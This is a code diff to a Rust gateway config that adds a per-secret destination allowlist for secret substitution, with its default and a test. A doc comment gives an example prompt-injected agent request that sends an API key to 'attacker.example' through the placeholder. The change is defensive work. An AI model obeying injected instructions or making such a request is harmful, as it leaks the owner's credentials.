@@ -1,3 +1,5 @@
+use std::collections::HashMap;
+
 use serde::{Deserialize, Serialize};
 
 /// What action to take for a request/response.
@@ -48,6 +50,29 @@ pub struct GatewayConfig {
     pub bypass_domains: Vec<String>,
     /// Log all traffic (even allowed) for audit
     pub audit_log: bool,
+    /// Per-secret destination allowlist. Keys are secret names (the
+    /// `NAME` from `{{secret:NAME}}`); values are host patterns the
+    /// secret may be substituted into. Patterns follow the same
+    /// host-matching semantics as `bypass_domains`: exact-or-DNS-suffix
+    /// for non-wildcard, glob with `*` matching `[^.]*` (no
+    /// dot-crossing) for wildcard.
+    ///
+    /// Behavior:
+    /// - Secret name absent from the map → no restriction (today's
+    ///   behavior preserved; opt-in tightening).
+    /// - Secret name present with empty list → DENY all destinations
+    ///   (explicit lock-down for secrets you want to disable
+    ///   substitution for entirely).
+    /// - Secret name present with non-empty list → destination host
+    ///   must match at least one pattern, else fail-closed.
+    ///
+    /// Per RFC §11.1 ("substituted-value exfiltration by the upstream
+    /// itself"). Defends against a prompt-injected agent calling
+    /// `https://attacker.example/?key={{secret:ANTHROPIC_API_KEY}}` —
+    /// without an allowlist, the gateway would dutifully substitute
+    /// and exfiltrate.
+    #[serde(default)]
+    pub secret_destination_allowlist: HashMap<String, Vec<String>>,
 }
 
 impl Default for GatewayConfig {
@@ -74,6 +99,10 @@ impl Default for GatewayConfig {
                 "10.*.*.*".into(),
             ],
             audit_log: true,
+            // Empty by default — preserves current behavior (no secret
+            // is destination-locked). Operators opt in per-secret as
+            // they tighten the deployment.
+            secret_destination_allowlist: HashMap::new(),
         }
     }
 }
@@ -142,6 +171,10 @@ mod tests {
             inject_credentials: false,
             bypass_domains: vec!["a.example".into(), "b.example".into()],
             audit_log: false,
+            secret_destination_allowlist: HashMap::from([
+                ("MY_KEY".into(), vec!["api.example.com".into()]),
+                ("LOCKED".into(), vec![]),
+            ]),
         };
         let json = serde_json::to_string(&config).unwrap();
         let deserialized: GatewayConfig = serde_json::from_str(&json).unwrap();
